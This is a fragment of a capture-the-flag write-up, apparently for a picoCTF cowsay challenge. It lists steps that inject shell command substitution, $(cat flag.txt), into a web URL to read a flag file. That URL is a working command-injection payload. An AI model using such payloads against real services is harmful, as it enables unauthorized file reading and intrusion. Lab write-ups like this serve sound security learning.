...
10. Observed a file named: flag.txt
...
11. Used command substitution again to read the contents of the file: $(cat flag.txt)
12. Submitted the payload: https://caas.mars.picoctf.net/cowsay/$(cat flag.txt)
